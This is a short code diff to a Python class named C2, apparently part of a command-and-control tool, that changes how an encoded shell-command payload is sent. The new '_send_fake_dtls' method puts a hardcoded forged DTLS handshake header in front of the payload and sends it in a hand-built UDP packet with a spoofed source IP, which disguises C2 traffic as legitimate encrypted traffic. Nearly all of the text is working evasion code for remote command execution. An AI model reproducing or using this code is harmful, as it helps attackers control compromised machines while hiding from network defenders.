@@ -98,12 +98,20 @@ class C2:
             payload = self._generate_payload(args, False)
         except UnicodeEncodeError:
             self.view.print_error("Could not encode shell command.")
-        self._send_udp(payload, args)
+        self._send_fake_dtls(payload, args)
 
-    def _send_udp(self, payload: bytes, args: argparse.Namespace) -> bool:
+    def _send_fake_dtls(self, payload: bytes, args: argparse.Namespace) -> bool:
+        payload_len = struct.pack("!H", len(payload))
+
+        dtls_header = bytes.fromhex(
+            "1601000000000000000002008c1000008000020000000000807cbcc8946c2eef41707386769349e4d0c468d225ef1a77faa3cc26e4afbf33b46da3c41af57577158ac201503bbbf90b83f538cfeca528026b72b0ac911c21ed575e5ab5805b31fd673615cad5e71bf6af85f667f005801c26d6f778398d41d6ed6846bf491ddea50940e92972ba87dea19ca359ffc6da42924c47a7589d0f84140100000000000000000300030100031601000001000000000000"
+        )
+        dtls_header += payload_len
+
         packet = (
             IP(dst=args.dip, src=args.sip)
             / UDP(dport=args.dport, sport=args.sport)
+            / dtls_header
             / payload
         )
 
